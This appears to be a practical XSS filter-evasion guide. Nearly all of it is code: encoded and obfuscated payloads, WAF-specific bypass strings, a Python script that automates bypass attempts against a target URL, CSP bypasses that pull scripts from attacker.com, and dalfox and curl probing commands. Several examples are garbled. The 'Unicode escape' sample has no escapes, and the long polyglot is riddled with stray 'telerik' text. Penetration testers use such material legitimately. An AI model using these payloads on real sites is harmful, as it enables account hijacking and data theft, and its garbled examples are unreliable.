# XSS Filter Evasion Guide

> Techniques for bypassing Web Application Firewalls (WAFs), input filters, and Content Security Policies using encoding tricks, polyglot payloads, and context-aware evasion strategies.

## 1. Encoding-Based Bypasses

WAFs often match literal strings. Encoding the payload defeats signature-based detection.

```html
<!-- HTML Entity Encoding -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;1&#41;>

<!-- Mixed HTML + URL encoding -->
<a href="javascript:alert(1)">click</a>
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">click</a>

<!-- Unicode escapes in JavaScript context -->
<script>alert(1)</script>

<!-- Hex encoding in event handlers -->
<body onload=\x61\x6c\x65\x72\x74(1)>

<!-- Base64 in data URIs -->
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
```

## 2. Case Manipulation and Null Bytes

```html
<!-- Mixed case to bypass case-sensitive filters -->
<ScRiPt>alert(1)</sCrIpT>
<IMG SRC=x OnErRoR=alert(1)>

<!-- Null bytes to break parser logic -->
<scr%00ipt>alert(1)</scr%00ipt>
<img src=x onerror="al\x00ert(1)">

<!-- Tab, newline, carriage return insertion -->
<img src=x onerror="a]l
e	r
t(1)">
<a href="j&#x09;avascript:alert(1)">click</a>
```

## 3. Tag and Attribute Obfuscation

```html
<!-- Lesser-known event handlers -->
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
<input onfocus=alert(1) autofocus>
<body onpageshow=alert(1)>
<style onload=alert(1)>

<!-- SVG-based payloads (often bypass HTML filters) -->
<svg onload=alert(1)>
<svg><animate onbegin=alert(1) attributeName=x>
<svg><set onbegin=alert(1) attributename=x>
<math><mtext><table><mglyph><svg><mtext><style><img src=x onerror=alert(1)>

<!-- Using data attributes and CSS -->
<div style="background:url('javascript:alert(1)')">
<link rel=import href="data:text/html,<script>alert(1)</script>">
```

## 4. WAF-Specific Bypass Techniques

```bash
# Identify WAF vendor first
wafw00f https://target.com

# Common WAF bypass patterns by vendor:

# Cloudflare bypass attempts
<svg/onload=alert(1)>
<svg onload=prompt%26%230000000040document.domain)>
<a"/telerik:alert(1)>click

# ModSecurity CRS bypass
<img src=x onerror="window['al'+'ert'](1)">
<img src=x onerror="top[/al/.source+/ert/.source](1)">
<img src=x onerror="self['\x61lert'](1)">

# AWS WAF bypass
<img src=x onerror=alert(1)//
<svg><script>alert&lpar;1&rpar;</script>
```

```python
# Automated WAF bypass testing with Python
import requests
import urllib.parse

payloads = [
    '<svg onload=alert(1)>',
    '<img src=x onerror=alert(1)>',
    '"><script>alert(1)</script>',
    "'-alert(1)-'",
    '<details/open/ontoggle=alert(1)>',
    '<math><mtext><table><mglyph><svg><mtext><style><img src=x onerror=alert(1)>',
]

encodings = [
    lambda p: p,                                    # Plain
    lambda p: urllib.parse.quote(p),                # URL encode
    lambda p: urllib.parse.quote(urllib.parse.quote(p)),  # Double URL encode
    lambda p: p.replace(' ', '/**/'),               # Comment insertion
    lambda p: p.replace('alert', 'al\\x65rt'),      # Hex escape
]

target = 'https://target.com/search?q='
for payload in payloads:
    for encode in encodings:
        encoded = encode(payload)
        r = requests.get(target + encoded, timeout=5)
        if r.status_code != 403 and 'blocked' not in r.text.lower():
            print(f'[BYPASS] {encoded[:80]}... Status: {r.status_code}')
```

## 5. JavaScript Execution Without Parentheses

```javascript
// When parentheses are filtered
// Using template literals (backticks)
alert`1`

// Using throw with onerror
<img src=x onerror="window.onerror=alert;throw 1">

// Using constructor and array destructuring
[].constructor.constructor('alert(1)')()

// Using Proxy
<img src=x onerror="new Proxy({},{get:(_,x)=>this[x]}).alert(1)">

// Using valueOf/toString override
<img src=x onerror="{toString:alert}+''">

// Without alert keyword at all
<img src=x onerror="self['\\x61\\x6c\\x65\\x72\\x74'](document.domain)">
<img src=x onerror="top[8680439..toString(30)](1)">
```

## 6. CSP Bypass Techniques

```html
<!-- Bypass via allowed CDN (JSONP endpoints) -->
<!-- If script-src includes a CDN with JSONP: -->
<script src="https://allowed-cdn.com/jsonp?callback=alert(1)//">
</script>

<!-- Bypass via base tag hijacking (if base-uri not set) -->
<base href="https://attacker.com/">
<script src="/malicious.js"></script>

<!-- Bypass via Angular (if angular.js is allowed) -->
<div ng-app ng-csp>
  {{$eval.constructor('alert(1)')()}}
</div>

<!-- Bypass strict-dynamic with pre-existing script -->
<script nonce="known-nonce">
  const s = document.createElement('script');
  s.src = 'https://attacker.com/evil.js';
  document.body.appendChild(s);  // Inherits trust via strict-dynamic
</script>
```

```bash
# Enumerate CSP for weaknesses
# Use Google CSP Evaluator or csp-evaluator CLI
curl -sI https://target.com | grep -i content-security-policy

# Check for JSONP endpoints on whitelisted domains
# Common JSONP endpoints that enable CSP bypass:
# - accounts.google.com/o/oauth2/revoke?callback=
# - cdn.jsdelivr.net (hosts arbitrary JS)
# - cdnjs.cloudflare.com/ajax/libs/angular.js/
```

## 7. Polyglot Payloads

```javascript
// Universal polyglot - works in multiple contexts
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0telerik%telerik0telerik1telerik/telerik/telerik*telerik/telerik+/telerik+/telerik!telerik*telerik/telerik"telerik;telerik{telerik}telerik//telerik\telerik/telerik%telerik0telerik&telerik-telerik*/alert()//'>"><details/open/ontoggle=confirm()>

// Context-adaptive payloads
// Works in: HTML attribute, JS string, URL context
"onmouseover="alert(1)" style="position:fixed;top:0;left:0;width:100%;height:100%
'-alert(1)-'
</script><script>alert(1)</script>

// Minimal polyglot for testing
'">><marquee><img src=x onerror=alert(1)>

// SVG polyglot (bypasses many HTML sanitizers)
<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
```

## 8. Testing Methodology

```bash
# Systematic filter evasion workflow
# Step 1: Identify what's filtered
for char in '<' '>' '"' "'" '(' ')' '/' 'on' 'script' 'alert'; do
  response=$(curl -s "https://target.com/search?q=${char}" | grep -c "${char}")
  echo "${char} -> reflected: ${response}"
done

# Step 2: Test encoding acceptance
curl -s "https://target.com/search?q=%3Csvg%20onload%3Dalert(1)%3E" | \
  grep -i "svg\|blocked\|forbidden"

# Step 3: Use dalfox for automated testing
go install github.com/hahwul/dalfox/v2@latest
dalfox url "https://target.com/search?q=test" \
  --waf-evasion \
  --blind "https://your-callback.xss.ht" \
  --output results.json

# Step 4: Manual verification of bypasses
# Always confirm in a real browser - some payloads
# work in curl but not in browser DOM parsing
```
